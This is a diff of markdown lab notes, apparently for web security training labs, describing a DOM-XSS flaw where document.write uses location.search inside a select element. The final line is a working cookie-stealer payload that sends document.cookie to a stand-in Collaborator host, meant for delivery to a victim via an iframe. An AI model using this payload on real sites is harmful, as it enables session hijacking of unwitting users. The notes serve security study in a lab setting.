@@ -141,7 +141,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ### Doc Write Location search  
 
->The target is vulnerable to DOM-XSS in the stock check function. Source code reveal ```document.write``` is the sink used with ```location.search``` allowing us to add new value to the JavaScript variable named **storeId** inside a ```<select>``` statement.  
+>The target is vulnerable to DOM-XSS in the stock check function. Source code reveal ```document.write``` is the sink used with ```location.search``` allowing us to add **storeId** query parameter with a value containing the JavaScript payload inside a ```<select>``` statement.  
 
 ![DOM-XSS doc write inside select](images/dom-xss-doc-write-inside-select.png)  
 
@@ -153,7 +153,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![get-dom-xss.png](images/get-dom-xss.png)  
 
->DOM XSS cookie stealer payload in a ```document.write``` sink using source ```location.search``` inside a ```<select>``` element. This can be send to victim via exploit server in ```<iframe>```.  
+>DOM XSS cookie stealer payload in a ```document.write``` sink using source ```location.search``` inside a ```<select>``` element. This can be send to victim via exploit server in ```<iframe>```. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
 
 ```html
 "></select><script>document.location='https://COLLABORATOR.com/?domxss='+document.cookie</script>//
